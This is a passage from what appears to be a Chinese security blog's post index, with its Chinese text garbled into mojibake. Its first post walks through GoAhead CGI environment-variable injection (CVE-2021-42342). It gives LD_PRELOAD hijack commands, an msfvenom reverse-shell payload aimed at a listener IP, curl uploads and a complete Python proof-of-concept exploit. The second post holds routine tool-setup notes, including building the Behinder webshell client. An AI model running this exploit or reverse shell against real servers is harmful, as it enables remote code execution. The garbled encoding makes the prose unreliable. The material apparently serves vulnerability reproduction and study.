è½½ï¼ŒLD_LIBRARY_PATHæŒ‡å®šçš„è·¯å¾„ï¼Œç¨‹åºä¼šå»å…¶ä¸­å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“\næˆ‘ä»¬å¯ä»¥æŒ‡å®šLD_PRELOAD=/proc/self/fd/0ï¼Œå› ä¸º/proc/self/fd/0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œè€ŒCGIç¨‹åºä¸­ï¼ŒPOSTæ•°æ®æµå³ä¸ºæ ‡å‡†è¾“å…¥æµï¼Œæˆ‘ä»¬å‘é€.soç»™http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0ï¼ŒCGIå°±ä¼šåŠ è½½æˆ‘ä»¬å‘é€çš„åŠ¨æ€é“¾æ¥åº“ï¼Œé€ æˆRCE\næµ‹è¯•ä¸€ä¸ªhello worldçš„.so\n#include \u0026lt;unistd.h\u0026gt; static void before_main(void) __attribute__((constructor)); static void before_main(void){ write(1, \u0026#34;Hello: World!\\n\u0026#34;, 14); } $ gcc -shared -fPIC hello.c -o hello.so $ curl -X POST --data-binary @hello.so \u0026#34;url/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0\u0026#34; -i æˆåŠŸä½œä¸ºå“åº”å¤´è¾“å‡ºï¼›å°è¯•åå¼¹shell\n$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp lhost=192.168.31.29 lport=8426 -f elf-so -o p.so $ curl -X POST --data-binary @p.so \u0026#34;http://192.168.31.214:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0\u0026#34; -i GoAhead / CVE-2021-42342 å¤ç° - vulhub | GoAheadç¯å¢ƒå˜é‡æ³¨å…¥å¤ç°è¸©å‘è®°\næ–°çš„æ´æ˜¯å¯¹ä¹‹å‰çš„ä¸€æ¬¡ç»•è¿‡ï¼Œè¡¥ä¸å¯¹ç”¨æˆ·ä¼ å…¥å‚æ•°è¿›è¡Œäº†é»‘åå•è¿‡æ»¤ï¼ŒLD_PRELOADè¿™ç±»å‚æ•°ä¸å†è®¾ç½®ä¸ºç¯å¢ƒå˜é‡ï¼Œä½†ç”±äºè¿™ä¸ªé™åˆ¶ä½¿ç”¨é”™äº†å‡½æ•°ï¼Œå¯¼è‡´å®é™…ä¸Šå¹¶æ²¡æœ‰ç”Ÿæ•ˆï¼›è¡¥ä¸è¿˜å°†ç”¨æˆ·ä¼ å…¥çš„å‚æ•°åå‰é¢å¢åŠ äº†å‰ç¼€ï¼Œå¯¼è‡´æ— æ³•åŠ«æŒä»»æ„ç¯å¢ƒå˜é‡ï¼Œä½†è¿™ä¸ªé™åˆ¶æ¼æ‰äº†multipartçš„POSTåŒ…ï¼Œæ‰€ä»¥æ”»å‡»è€…é€šè¿‡è¿™ä¸ªæ–¹å¼ä»ç„¶å¯ä»¥æ³¨å…¥ä»»æ„ç¯å¢ƒå˜é‡\næ³¨æ„ï¼Œæ–°ç‰ˆæœ¬çš„GoAheadé»˜è®¤æ²¡æœ‰å¼€å¯CGIï¼Œè€Œè€ç‰ˆæœ¬å¦‚æœæ²¡æœ‰cgi-binç›®å½•ï¼Œæˆ–è€…é‡Œé¢æ²¡æœ‰cgiæ–‡ä»¶ï¼Œä¹Ÿä¸å—è¿™ä¸ªæ¼æ´å½±å“\næ—§çš„æ´æ˜¯é€šè¿‡è®¾ç½®LD_PRELOAD=/proc/self/fd/0 åŒæ—¶å°†æ¶æ„.soä½œä¸ºbodyä¼ å…¥ï¼Œåšåˆ°rceçš„æ•ˆæœï¼Œè€Œè¿™é‡Œæˆ‘ä»¬éœ€è¦åœ¨bodyä¸­å‘é€ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©æå‰åœ¨æœåŠ¡å™¨ä¸Šä¸Šä¼ .soï¼Œä¹‹åå†æŠŠLD_PRELOADè®¾ç½®ä¸ºè¿™ä¸ªæ–‡ä»¶çš„è·¯å¾„\nä¸PHPä¸€æ ·ï¼ŒGoAheadåœ¨é‡åˆ°ä¸Šä¼ å†…å®¹æ—¶ä¼šå­˜åœ¨ä¸´æ—¶æ–‡ä»¶ï¼Œä¸è¿‡è¿™é‡Œçš„å‘åœ¨äºä¸´æ—¶æ–‡ä»¶çš„ç›®å½•é…ç½®\n#ifndef ME_GOAHEAD_UPLOAD_DIR #define ME_GOAHEAD_UPLOAD_DIR \u0026#34;tmp\u0026#34; #endif PUBLIC void websUploadOpen(void) { uploadDir = ME_GOAHEAD_UPLOAD_DIR; if (*uploadDir == \u0026#39;\\0\u0026#39;) { #if ME_WIN_LIKE uploadDir = getenv(\u0026#34;TEMP\u0026#34;); #else uploadDir = \u0026#34;/tmp\u0026#34;; #endif } trace(4, \u0026#34;Upload directory is %s\u0026#34;, uploadDir); websDefineHandler(\u0026#34;upload\u0026#34;, 0, uploadHandler, 0, 0); } å¦‚æœå®ME_GOAHEAD_UPLOAD_DIRæ²¡æœ‰å®šä¹‰ï¼Œåˆ™uploadDir=/tmpï¼Œè€Œè¿™ä¸ªå®ä¸€å®šä¸ä¸ºç©ºï¼Œæ‰€ä»¥ç›´æ¥å°±æ˜¯tmpï¼Œè¿™ä¸ªç›¸å¯¹ç›®å½•å–å†³äºpwdï¼Œè€Œpwdæ˜¯GoAheadå¯åŠ¨æ—¶--homeå‚æ•°æŒ‡å®šçš„ï¼Œæ˜¯å­˜æ”¾é…ç½®æ–‡ä»¶çš„ç›®å½•\nå¦‚æœ--home /etc/goaheadï¼Œé‚£ä¸´æ—¶æ–‡ä»¶é»˜è®¤åœ¨/etc/goahead/tmpï¼Œå¦‚æœè¿™ä¸ªç›®å½•ä¸å­˜åœ¨æˆ–è€…ä¸å¯å†™ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°ä¸Šä¼ æ—¶500ï¼Œä¸€æ—¦ç›®æ ‡æ²¡æœ‰æ­£å¸¸é…ç½®è¿™ä¸ªç›®å½•ï¼Œå°±æ— æ³•æ”»å‡»ï¼ˆæˆ–è€…å‚è§pbCTF2021 advancementçš„wpï¼Œä½¿ç”¨python\nè¿™é‡Œç›´æ¥ä¿®æ”¹Dockerfileæ¥æŒ‡å®šä¸´æ—¶æ–‡ä»¶ç›®å½•\nmake SHOW=1 ME_GOAHEAD_UPLOAD_DIR=\u0026#34;\u0026#39;\\\u0026#34;/tmp\\\u0026#34;\u0026#39;\u0026#34; å°è¯•hello world\n#include \u0026lt;unistd.h\u0026gt; static void before_main(void) __attribute__((constructor)); static void before_main(void) { write(1, \u0026#34;Hello: World\\r\\n\\r\\n\u0026#34;, 16); write(1, \u0026#34;Hacked\\n\u0026#34;, 7); } $ gcc -shared -fPIC hello.c -o hello.so $ curl -v -F data=@hello.so -F \u0026#34;LD_PRELOAD=/proc/self/fd/7\u0026#34; \u0026#34;url/cgi-bin/test\u0026#34; -i æŸ¥çœ‹æ—¥å¿—æŠ¥Too bigé”™è¯¯\n#ifndef ME_GOAHEAD_LIMIT_POST #define ME_GOAHEAD_LIMIT_POST 16384 #endif æœ€å¤§16384å­—èŠ‚ï¼Œæˆ‘ä»¬åœ¨gccæ—¶å¢åŠ -så‚æ•°æ¥å‡å°ä½“ç§¯\n$ gcc -s -shared -fPIC hello.c -o hello.so $ curl -v -F data=@hello.so -F \u0026#34;LD_PRELOAD=/proc/self/fd/7\u0026#34; \u0026#34;http://192.168.31.214:8080/cgi-bin/test\u0026#34; ç»“æœæŠ¥404ï¼Œfd/nè¿™æ ·çš„æ–‡ä»¶æè¿°ç¬¦å¯¹åº”çš„å†…å®¹éƒ½æ— æ³•æ‰“å¼€ï¼Œpç‰›çŒœæµ‹çš„å¯èƒ½æ˜¯ï¼šCGIæ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œè¢«æ‰“å¼€çš„ä¸´æ—¶æ–‡ä»¶æè¿°ç¬¦å·²ç»å…³é—­ï¼Œæ‰€ä»¥æ— æ³•æ‰“å¼€\nç…§è¿™æ ·çš„æ¨æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°æ¡ä»¶ç«äº‰ï¼Œä¸€ä¸ªä¸Šä¼ ä¸€ä¸ªåŒ…å«ï¼Œæˆ–è€…æ˜¯ç»™.soæ–‡ä»¶åå¢åŠ è„å­—ç¬¦ ä½†æ˜¯CLå¤´çš„é•¿åº¦å°äºæœ€ç»ˆæ•°æ®åŒ…çš„å¤§å°ï¼Œè¿™æ ·GoAheadè¯»å–æ•°æ®åŒ…çš„æ—¶å€™èƒ½å¤Ÿå®Œå…¨è¯»å–åˆ°payload.soçš„å†…å®¹ï¼Œä½†å®é™…è¿™ä¸ªæ–‡ä»¶å¹¶æ²¡æœ‰ä¸Šä¼ å®Œæ¯•\né¦–å…ˆæ„é€ å¥½ä¹‹å‰é‚£ä¸ªæ— æ³•åˆ©ç”¨çš„æ•°æ®åŒ…ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªè¡¨å•å­—æ®µæ˜¯LD_PRELOADï¼Œå€¼æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä¸€èˆ¬æ˜¯/proc/self/fd/7ï¼Œä¹‹åå¯¹ä¹‹å‰çš„æ•°æ®åŒ….soæœ«å°¾å¢åŠ å‡ åƒä¸ªå­—èŠ‚çš„è„å­—ç¬¦ï¼Œæ¯”å¦‚è¯´aï¼Œä¹‹åå°†æ•°æ®åŒ…çš„CLè®¾ç½®ä¸ºä¸è¶…è¿‡16384çš„å€¼ï¼Œä½†æ¯”payload.soæ–‡ä»¶çš„å¤§å°è¦å¤§ä¸ª500å­—èŠ‚å·¦å³\nç”±äºä¸Šä¼ æµç¨‹æ²¡æœ‰ç»“æŸï¼Œæ‰€ä»¥æ­¤æ—¶æ–‡ä»¶æè¿°ç¬¦æ˜¯æ²¡æœ‰å…³é—­çš„ï¼Œå¯ä»¥é€šè¿‡/proc/self/fd/7è¯»å–åˆ°ï¼Œè„å­—ç¬¦ä¹Ÿä¸å½±å“åŠ¨æ€é“¾æ¥åº“çš„åŠ è½½å’Œè¿è¡Œï¼Œæœ€åå³å¯æˆåŠŸå®ŒæˆåŠ«æŒ\npç‰›å·²ç»å†™å¥½äº†è„šæœ¬\nimport sys import socket import ssl import random from urllib.parse import urlparse, ParseResult PAYLOAD_MAX_LENGTH = 16384 - 200 def exploit(client, parts: ParseResult, payload: bytes): path = \u0026#39;/\u0026#39; if not parts.path else parts.path boundary = \u0026#39;----%s\u0026#39; % str(random.randint(1000000000000, 9999999999999)) padding = \u0026#39;a\u0026#39; * 2000 content_length = min(len(payload) + 500, PAYLOAD_MAX_LENGTH) data = fr\u0026#39;\u0026#39;\u0026#39;POST {path} HTTP/1.1 Host: {parts.hostname} Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary={boundary} Content-Length: {content_length} --{boundary} Content-Disposition: form-data; name=\u0026#34;LD_PRELOAD\u0026#34;; /proc/self/fd/7 --{boundary} Content-Disposition: form-data; name=\u0026#34;data\u0026#34;; filename=\u0026#34;1.txt\u0026#34; Content-Type: text/plain #payload#{padding} --{boundary}-- \u0026#39;\u0026#39;\u0026#39;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) data = data.encode().replace(b\u0026#39;#payload#\u0026#39;, payload) client.send(data) resp = client.recv(20480) print(resp.decode()) def main(): target = sys.argv[1] payload_filename = sys.argv[2] with open(payload_filename, \u0026#39;rb\u0026#39;) as f: data = f.read() if len(data) \u0026gt; PAYLOAD_MAX_LENGTH: raise Exception(\u0026#39;payload size must not larger than %d\u0026#39;, PAYLOAD_MAX_LENGTH) parts = urlparse(target) port = parts.port if not parts.port: if parts.scheme == \u0026#39;https\u0026#39;: port = 443 else: port = 80 context = ssl.create_default_context() with socket.create_connection((parts.hostname, port), timeout=8) as client: if parts.scheme == \u0026#39;https\u0026#39;: with context.wrap_socket(client, server_hostname=parts.hostname) as ssock: exploit(ssock, parts, data) else: exploit(client, parts, data) if __name__ == \u0026#39;__main__\u0026#39;: main() $ python3 poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so æˆåŠŸåŠ«æŒ\nâ€”â€”â€”â€”ç”±äºæœ€è¿‘ä¹Ÿå­¦ä¹ äº†CL\u0026amp;TEå¤´çš„ç›¸å…³å†…å®¹ï¼Œå†çœ‹åˆ°è¿™é‡Œçš„å®ç°ç»†èŠ‚æ„Ÿè§‰è¿˜æŒºäº²åˆ‡çš„ï¼ˆè¯´æ˜è‡ªå·±å­¦çš„å®åœ¨å¤ªå°‘äº†ï¼ˆ\næ˜¯å­¦ä¹ ç¬”è®°ï¼Œæœ‰å¾ˆå¤šç–æ¼è¿˜è¯·è°…è§£ï¼ˆ\nä¸€ç›´ä¸å¼€å­¦ï¼Œåœ¨å®¶å‡ ä¸ªæœˆå¤šå°‘æœ‰ç‚¹æ‡ˆæ€ ï¼Œä½†æ˜¯æ—¶é—´ä¸ç­‰äººå•Šï¼Œä¸è¦è’åºŸäº†è‡ªå·±\n","date":"2022-03-23T18:33:39+08:00","permalink":"https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/","section":"posts","tags":["ç¯å¢ƒå˜é‡","RCE"],"title":"ç¯å¢ƒå˜é‡ç›¸å…³é—®é¢˜"},{"categories":["LTS","ç¯å¢ƒé…ç½®"],"contents":" æœ¬åœ°æ­å»ºVisual Regexp æ­å»ºåŸå› å¤§å®¶åº”è¯¥éƒ½æ‡‚å§ï¼Œä¸€ä¸ªæ˜¯æ­£åˆ™å¯è§†åŒ–å®åœ¨æ˜¯å¾ˆé¦™å¾ˆå¿…è¦ï¼Œå…¶æ¬¡çº¿ä¸‹æ²¡ç½‘çš„è¯æ²¡æœ‰ä¸ªç¦»çº¿å·¥å…·å°±å¾ˆå®¹æ˜“ggï¼ŒåŒç±»å·¥å…·è¿˜æœ‰cyberchefç­‰\nVisual Regexpåœ¨çº¿åœ°å€ | githubä»“åº“\nåœ¨git cloneä¹‹åé¦–å…ˆè‚¯å®šæ˜¯npm installï¼Œå‡ºç°vulnerabilitieså¾ˆæ­£å¸¸ï¼Œç›´æ¥npm audit fix --forceï¼Œä¸€æ¬¡ä¸è¡Œå°±ä¸¤æ¬¡\nå¥‡è‘©çš„æ˜¯ä½œè€…è‡ªå·±çš„visual-regexåŒ…ä¸€ç›´æ˜¯ä»¥å¿«æ·æ–¹å¼çš„å½¢å¼è¢«å®‰è£…ï¼ˆåæ¥å‘ç°æ˜¯æ•´ä¸ªé¡¹ç›®çš„package.jsonç¼–å†™çš„é—®é¢˜ï¼‰\nè§£å†³æ–¹æ³•ï¼šåˆ é™¤å¿«æ·æ–¹å¼ï¼Œå•ç‹¬å®‰è£…npm i visual-regexï¼Œç”¨everythingæŸ¥æ‰¾åˆ°è¯¥åŒ…å…·ä½“å­˜åœ¨çš„ä½ç½®ï¼Œå¤åˆ¶åˆ°node_modulesç›®å½•ä¸‹\nä¹‹ååˆ°buildç›®å½•ä¸‹node .\\build.js\næŠ¥é”™hightlight.jså¹¶æ²¡æœ‰å¼•å…¥./lib/highlightï¼ŒæŸ¥çœ‹\\highlight.js\\package.jsonçš„exportséƒ¨åˆ†ï¼Œå‘ç°ç¬¬90è¡Œçš„å¼•ç”¨æ˜¯\u0026quot;.\u0026quot;ï¼Œå°†å…¶æ”¹ä¸º\u0026quot;./lib/highlight\u0026quot;\nå†æ¬¡buildæç¤º*\u0026lsquo;NODE_ENV\u0026rsquo; is not recognized as an internal or external command, operable program or batch file.*ï¼ˆæ­¤å¤„æˆªå›¾èµ°ä¸¢äº†ï¼‰ï¼Œè§£å†³æ–¹æ³•npm install -g win-node-env\nä¹‹ånode .\\build.jså³å¯æˆåŠŸbuildï¼Œåœ¨devlistæ–‡ä»¶å¤¹ä¸‹çš„index.htmlå³å¯æ­£å¸¸ä½¿ç”¨ç›¸å…³åŠŸèƒ½\næ— æ³•æ‰“å¼€jaråŒ…åº”ç”¨ è¿™ä¸ªåº”è¯¥å±äºå¸¸è§é—®é¢˜äº†ï¼Œä¸€èˆ¬åŸå› æ˜¯javaç‰ˆæœ¬ä¸å¯¹\nå¾ˆå¤šäººé€‰æ‹©è®¾ç½®ä¸åŒåå­—çš„ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚java8ï¼Œjava11ï¼Œæˆ‘çš„è¯æ˜¯åªæœ‰java11æ˜¯ç¯å¢ƒå˜é‡ï¼Œåœ¨æœ‰äº›jaréœ€è¦java8çš„ç¯å¢ƒæ—¶ç›´æ¥ç”¨everythingæœç´¢java.exeï¼Œå¤åˆ¶è·¯å¾„ä¹‹åxxx\\java.exe -jar xyz.jarè¿™æ ·æ¥è¿è¡Œ\nè¿œç¨‹è°ƒè¯•Node.js åœºæ™¯ï¼šç”¨vulhubæˆ–å…¶å®ƒå·²ç»æ‰“åŒ…å¥½çš„dockerç¯å¢ƒå¤ç°cveéœ€è¦è¿œç¨‹è°ƒè¯•\né¦–å…ˆä¿®æ”¹å¯¹åº”çš„dockeræ–‡ä»¶ï¼špackage.jsonçš„\u0026quot;scripts\u0026quot;å­—æ®µçš„\u0026quot;start\u0026quot;éƒ¨åˆ†å¢åŠ --inspect=0.0.0.0:portï¼ŒæŒ‡åè°ƒè¯•æ—¶çš„ç›‘å¬ç«¯å£\ndocker-compose.ymlä¸­å¢åŠ ç›‘å¬ç«¯å£\u0026quot;8000:9229\u0026quot;ï¼Œä¹‹åæ­£å¸¸docker-compose up -d\næœ¬åœ°å…ˆä¸‹è½½å¥½ä¸€æ ·çš„æ–‡ä»¶ï¼Œç”¨vscodeç”Ÿæˆä¸€ä¸ªè°ƒè¯•æ–‡æ¡£lauch.json\néœ€è¦æ”¹çš„é…ç½®æœ‰addressï¼ˆè¿œç¨‹ipï¼‰ï¼Œportï¼ˆè¿œç¨‹ç›‘å¬ç«¯å£ï¼‰ï¼ŒlocalRootï¼ˆæœ¬åœ°è·¯å¾„ï¼‰ï¼Œremoteï¼ˆè¿œç¨‹è·¯å¾„ï¼‰ï¼Œä¹‹åå³å¯æ‰“æ–­ç‚¹è°ƒè¯•\nå‡ºç°unbound breakpointæ­£å¸¸ï¼Œå¤§æ¦‚ç‡æ˜¯ä½ çš„äº¤äº’å°±æ²¡æ‰§è¡Œåˆ°æ‰“æ–­ç‚¹çš„åœ°æ–¹ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆååº”\nVirtualBoxç»™è™šæ‹Ÿæœºç£ç›˜æ‰©å®¹ å½“åˆç»™kaliåªåˆ†é…äº†16Gï¼ˆæ— å¥ˆå•Šï¼Œè°è®©æˆ‘ä¸»æœºä¹Ÿå°±512ï¼Œå¾—çœç€ç”¨ï¼‰ï¼Œå¯¼è‡´ä»Šå¤©pipä¸€ä¸ªåŒ…éƒ½å¤±è´¥\nä¹‹åæˆ‘ç›´æ¥ç”¨è‡ªå¸¦çš„ä¸»æœºä»‹è´¨ç®¡ç†å™¨å¢åŠ ç›˜ç‰‡çš„å¤§å°\nå½“æˆ‘æŠŠä¸‹é¢æ˜¾ç¤ºå¤§å°çš„æ¡æ»‘åˆ°24Gçš„æ—¶å€™æˆ‘è§‰å¾—ç¨³äº†ï¼Œè¿™è¿˜èƒ½ä¸å¤Ÿç”¨ï¼Ÿï¼Ÿï¼Ÿäºæ˜¯è‡ªä¿¡å¼€æœº\nç¬‘æ­»ï¼ŒGPartedæ²¡è¯†åˆ«å‡ºæ¥ï¼Œdf -hä¹Ÿå®Œå…¨æ²¡å˜åŒ–ï¼Œæˆ‘å°±åˆå¤šåˆ†é…äº†4Gï¼Œç»“æœè£‚å¼€ï¼Œè¿˜æ˜¯æ²¡è¯†åˆ«\nç„¶åæˆ‘å‘ç°é—®é¢˜åœ¨äºå¿«ç…§çš„å­˜å‚¨æ˜¯å•ç‹¬æœ‰ä¸€ä¸ªuuidçš„vdiçš„ï¼Œè€Œæ‰©å®¹æ—¶æˆ‘é€‰æ‹©åœ¨æœ€ä¸Šå±‚çš„kali.vdiæ‰©å®¹ï¼Œå¯¼è‡´ä¸ä¼šåŒæ­¥åˆ°ä¸‹é¢çš„å¿«ç…§çš„å­˜å‚¨ä¿¡æ¯\nè§£å†³æ–¹æ³•å°±æ˜¯æŠŠå‰é¢æ‰€æœ‰çš„å¿«ç…§åˆ é™¤æ‰ï¼Œä¹‹åå†å¼€æœºå°±å¯ä»¥è¯†åˆ«äº†\nç”±äºæœªåˆ†é…å’Œ/dev/sda1ä¹‹é—´éš”ç€æ‰©å±•åˆ†åŒºå’Œswapï¼Œæ‰€ä»¥å…ˆåˆ é™¤è¿™ä¸¤ä¸ªï¼Œæ‰©å®¹åå†æ–°å»ºåŠ å›æ¥\nåº”ç”¨ä¿®æ”¹ä¹‹åè‡ªä¿¡å¼€æœºï¼Œå‘ç°æ€ä¹ˆkaliçš„é¾™åŠå¤©éƒ½ä¸è“â€¦â€¦ ä¸€ç•ªæ’é”™ï¼Œä¹‹åå‘ç°æ˜¯å› ä¸ºswapåˆ†åŒºçš„uuidå‘ç”Ÿæ”¹å˜å¯¼è‡´swapæ²¡æœ‰æ­£å¸¸æŒ‚è½½ï¼ˆswapon --showå›æ˜¾ä¸ºç©ºï¼‰\nè¾“å…¥blkidå¤åˆ¶/dev/sda5çš„uuidï¼Œå°†å…¶å¤åˆ¶ç²˜è´´åˆ°/etc/fstabçš„å¯¹åº”ä½ç½®ï¼Œå°±å¥½å•¦\nusage of api documented as @since xxx idea-\u0026gt;Project Structure-\u0026gt;Project Settings-\u0026gt;Language level\ntomcat\u0026amp;éƒ¨ç½²waråŒ… å‚»é€¼Javaï¼Œæ€»æ˜¯ä¸€å †é—®é¢˜\né¦–å…ˆæ˜¯æ‰“waråŒ…ï¼Œç”¨Maven\nå°†ä¼šå¯¼å‡ºwaråˆ°targetç›®å½•ä¸‹ï¼Œå°†å®ƒå¤åˆ¶åˆ°tomcat/webappsç›®å½•ä¸‹ï¼Œå¯åŠ¨ï¼Œç»“æœç›´æ¥æ¥äº†404\norg.apache.catalina.core.StandardContext.startInternal ä¸€ä¸ªæˆ–å¤šä¸ªlistenerså¯åŠ¨å¤±è´¥ï¼Œæ›´å¤šè¯¦ç»†ä¿¡æ¯æŸ¥çœ‹å¯¹åº”çš„å®¹å™¨æ—¥å¿—æ–‡ä»¶ åœ¨tomcatä¸‹çš„logsç›®å½•æŸ¥çœ‹localhost.year-month-day.logï¼Œå‘ç°è¯¦ç»†æŠ¥é”™ä¸ºorg.apache.catalina.core.StandardContext.listenerStart é…ç½®åº”ç”¨ç¨‹åºç›‘å¬å™¨[org.apache.shiro.web.env.EnvironmentLoaderListener]é”™è¯¯\näºæ˜¯è€ƒè™‘æ˜¯æ‰“åŒ…æ—¶æ²¡æœ‰å¸¦ä¸Šä¾èµ–ï¼ŒæŸ¥çœ‹waræ‰“åŒ…æ—¶çš„libæ–‡ä»¶å¤¹å‘ç°éƒ½ä¸ç¼º\nå†å›çœ‹å®Œæ•´æŠ¥é”™ï¼Œåœ¨æœ€åæœ‰Caused by: java.lang.ClassNotFoundException: javax.servlet.ServletContextListenerï¼Œå‘ç°é—®é¢˜å’Œæˆ‘ä»¬æ‰“åŒ…æ— å…³ è€Œæ˜¯tomcatç‰ˆæœ¬çš„é—®é¢˜\né€šè¿‡ä¸‹è½½tomcat9ç‰ˆæœ¬æ¥è§£å†³æŠ¥é”™ï¼Œæ­¤å¤„æ˜¯ä¸‹è½½é“¾æ¥ï¼Œç›´æ¥è§£å‹\n./bin/catalina.sh run # ç”¨è¿™ä¸ªå‘½ä»¤ä¸ºäº†è®©ç®€çŸ­æŠ¥é”™ç›´æ¥æ‰“å°åœ¨console ideaè¿œç¨‹è°ƒè¯•java webé¡¹ç›®(jar/tomcat) java -jaræ–¹å¼å¯åŠ¨ ä»¥å¤ç°CVE-2020-13933ä¸ºä¾‹ï¼Œè¿™é‡Œjavaé¡¹ç›®ç›´æ¥-jarå³å¯å¯åŠ¨ï¼Œæ— éœ€ä¾èµ–tomcatä½œwebæœåŠ¡å™¨\ndocker pull jackey0/cve-2020-11989 docker cp \u0026lt;container-id\u0026gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/ # 8426å¯¹å¤–webç«¯å£, 8001å¯¹å¤–è°ƒè¯•ç«¯å£ docker run -p 8426:8080 -p 8001:1456 \u0026lt;image-id\u0026gt; /bin/sh -c \u0026#39;java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; æ­¤å¤„æ·»åŠ å‚æ•°ä¸dockerçš„ç›¸åŒ\ntomcatåŠ è½½waråŒ…æ–¹å¼ ç¼–è¾‘tomcatç›®å½•ä¸‹./bin/catalina.shï¼Œæœç´¢JPDA_ADDRESSï¼Œä¿®æ”¹\nJPDA_ADDRESS=\u0026#34;0.0.0.0:8000\u0026#34; ç„¶åideaè®¾ç½®ä¸ä¸Šé¢ç›¸åŒï¼Œtomcatå¯åŠ¨\n./catalina.sh jpda run ideaçš„è¿œç¨‹çœ‹ç€èŠ±å“¨ï¼Œæœ‰ä¸€å †è®¾ç½®å¯ä»¥é€‰ï¼Œä½†æ˜¯é‚£ä¸ªçœ‹èµ·æ¥æ–¹ä¾¿çš„tomcat remote serverè°ƒè¯•å®é™…è¿œä¸å¦‚è¿™æ ·ï¼Œåƒåœ¾\nä¹‹åæ‰“æ–­ç‚¹è°ƒè¯•å³å¯ï¼Œç†Ÿç»ƒæŒæ¡å³é”®-\u0026gt;add as a libraryçš„æ–¹å¼è°ƒè¯•æ ¸å¿ƒjar\nideaæ‰“jaråŒ…ï¼ˆémavenï¼‰ mavençš„è¯ç›¸å½“ç®€å•ï¼Œç›´æ¥ç”¨å³ä¾§mavenå·¥å…·æ å³å¯å®Œæˆbuild\némavenä¸‹ï¼Œä»¥é€šè¾¾OAç»¼åˆåˆ©ç”¨å·¥å…·ä¸ºä¾‹\næ³¨æ„åˆ°æ ¹ç›®å½•ä¸‹å°±æœ‰.ideaæ–‡ä»¶å¤¹ï¼Œä½†æ˜¯ç›´æ¥ideaæ‰“å¼€å¹¶buildå¹¶ä¸ä¼šå¾—åˆ°ç¼–è¯‘å¥½çš„jarï¼Œæ’é”™åå‘ç°manifest fileæŒ‡å®šçš„com.xxxä¸»ç±»æœ‰é—®é¢˜ï¼Œæ˜¯é¡¹ç›®çš„moduleæ²¡æœ‰è®¾ç½®å¥½\néœ€è¦åœ¨è¿™é‡Œè®¾ç½®Content Rootï¼Œè¿™æ ·æ‰å¯ä»¥åœ¨Artifactså¤„æ­£ç¡®è¯»å–åˆ°Manifest Fileï¼ˆä¸ç„¶æ˜¯ä¸æ­£å¸¸çš„ï¼‰ï¼Œå¹¶ä¸”module sdkä¹Ÿè¦è®¾ç½®å¥½ï¼ˆä¸ç„¶ä¸ºç©ºï¼‰\nä¹‹åå‹¾é€‰Include in project buildï¼Œå†buildå°±æ­£å¸¸äº†\nideaæ‰“jaråŒ…ï¼ˆmavenï¼‰ ä»¥å†°è3.0.11ä¸ºä¾‹ï¼Œä¸‹è½½githubä¸Šå·²ç»åç¼–è¯‘å¥½çš„æºç ï¼ˆæ„Ÿè°¢å¸¦ä½¬çš„åç¼–è¯‘ï¼‰\ngit clone https://github.com/MountCloud/BehinderClientSource.git ideaæ‰“å¼€ï¼Œé¦–å…ˆæŠŠé¡¹ç›®sdkä¹‹ç±»çš„æ”¹æˆjdk8ï¼Œç„¶åå°±æ˜¯æ’é”™ä¹‹è·¯ï¼š\npom.xmlçš„com.sunçš„systemPathæ”¹ä¸ºç»å¯¹è·¯å¾„ é»˜è®¤æ˜¯å–ç”¨ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œæˆ‘æœ¬æœºä¸»è¦è¿˜æ˜¯java11ï¼Œè€Œcom.sunçš„é‚£ä¸ªåŒ…åœ¨java8ä¸‹é¢ï¼Œæ‰€ä»¥æˆ‘æ”¹æˆäº†ç»å¯¹è·¯å¾„\nideaè™½ç„¶å¯ä»¥è‡ªåŠ¨è§£å†³mavenä¾èµ–ç¼ºå¤±é—®é¢˜ï¼Œä½†æ˜¯å¯èƒ½ä¼šç”±äºçƒ‚ç½‘å¯¼è‡´æŸä¸ªä¾èµ–ä¸‹è½½ä¸€åŠç•™ä¸‹ä¸€å †sha1, partæ–‡ä»¶å´æ²¡æœ‰ä¸»ä½“jarï¼Œåªéœ€è¦æŠŠè¿™ä¸ªä¾èµ–çš„ä¸»æ–‡ä»¶å¤¹åˆ æ‰ï¼Œå†maven reloadå³å¯é‡æ–°ä¸‹è½½ å…¶å®ƒé—®é¢˜å°±æ²¡æœ‰äº†ï¼Œç›´æ¥maven packageå³å¯å¾—åˆ°ç›®æ ‡jar\nè¿˜æœ‰éƒ¨åˆ†åŒ…çš„é—®é¢˜ï¼Œå¯ä»¥çœäº‹éƒ½æ”¹æˆ\u0026lt;scope\u0026gt;provided\u0026lt;/scope\u0026gt;ï¼Œæœ‰ä¾èµ–ä¼šå¥½äº›\nnet.rebeyond.behinder.dao.ShellManager#ShellManager()çš„DB_PATHä¿®æ”¹ä¸º./data.dbï¼ŒæŠŠèµ„æºæ–‡ä»¶ä¸­çš„data.dbæ”¾å…¥targetä¸‹ å’Œæœ€åçš„jaråŒ…åŒç›®å½•å³å¯\nideaåœ¨buildé¡¹ç›®æ—¶æŠ¥é”™ internal java compiler error æœ‰ä»¥ä¸‹å‡ ä¸ªéœ€è¦æ’é”™çš„åœ°æ–¹\nProject Structure Settings pom.xml java rmiè°ƒè¯•æŠ¥é”™è§£å†³ 